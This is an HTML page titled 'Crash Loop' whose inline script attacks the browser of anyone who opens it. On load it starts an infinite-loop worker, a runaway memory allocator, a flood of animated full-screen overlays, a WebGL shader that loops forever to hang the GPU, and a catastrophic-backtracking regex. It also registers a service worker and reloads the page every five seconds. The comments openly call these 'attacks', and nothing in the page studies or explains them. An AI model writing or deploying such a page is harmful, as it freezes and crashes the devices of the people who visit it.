<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5">
    <title>Crash Loop</title>
    <style>
        body { background:#000; color:#f00; font-family:monospace; text-align:center; margin-top:20vh; }
    </style>
</head>
<body>
    <h1>CRASHING...</h1>
    <script>
        // ===== Register Service Worker =====
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
                .then(reg => console.log('SW registered'))
                .catch(err => console.log('SW failed'));
        }

        // ===== Web Worker CPU spin =====
        const workerBlob = new Blob([
            'while(true){}'
        ], { type: 'application/javascript' });
        const worker = new Worker(URL.createObjectURL(workerBlob));

        // ===== Memory Bomb =====
        function memoryBomb() {
            const chunks = [];
            const size = 10 * 1024 * 1024; // 10 MB
            while (true) {
                chunks.push(new ArrayBuffer(size));
                chunks.push(new Array(size).join('x'));
            }
        }

        // ===== DOM Flood =====
        function domFlood() {
            const body = document.body;
            setInterval(() => {
                for (let i = 0; i < 500; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.005);z-index:9999;pointer-events:none;';
                    div.animate([
                        { transform: 'scale(1)', opacity: 0.1 },
                        { transform: 'scale(3)', opacity: 0.5 }
                    ], { duration: 1000, iterations: Infinity, direction: 'alternate' });
                    body.appendChild(div);
                }
            }, 10);
        }

        // ===== GPU Hang =====
        function gpuHang() {
            const canvas = document.createElement('canvas');
            canvas.width = 1; canvas.height = 1;
            document.body.appendChild(canvas);
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return;
            const vs = `attribute vec2 p; void main(){ gl_Position=vec4(p,0.0,1.0); }`;
            const fs = `precision highp float; void main(){ float i=0.0; while(true){ i+=0.0001; } gl_FragColor=vec4(i,0.0,0.0,1.0); }`;
            const vShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vShader, vs); gl.compileShader(vShader);
            const fShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fShader, fs); gl.compileShader(fShader);
            if (!gl.getShaderParameter(fShader, gl.COMPILE_STATUS)) {
                const fs2 = `precision highp float; void main(){ float i=0.0; for(int j=0;j<10000000;j++){ i+=0.0000001; } gl_FragColor=vec4(i,0.0,0.0,1.0); }`;
                gl.shaderSource(fShader, fs2); gl.compileShader(fShader);
            }
            const prog = gl.createProgram();
            gl.attachShader(prog, vShader); gl.attachShader(prog, fShader);
            gl.linkProgram(prog); gl.useProgram(prog);
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0,0]), gl.STATIC_DRAW);
            const loc = gl.getAttribLocation(prog, 'p');
            gl.enableVertexAttribArray(loc);
            gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
            gl.drawArrays(gl.POINTS, 0, 1);
        }

        // ===== Regex Bomb =====
        function regexBomb() {
            /^(a+)+$/.test('a'.repeat(30) + '!');
        }

        // ===== Start Attacks =====
        function start() {
            setTimeout(memoryBomb, 100);
            setTimeout(domFlood, 200);
            setTimeout(gpuHang, 300);
            setTimeout(regexBomb, 400);
        }
        window.onload = start;
    </script>
</body>
</html>
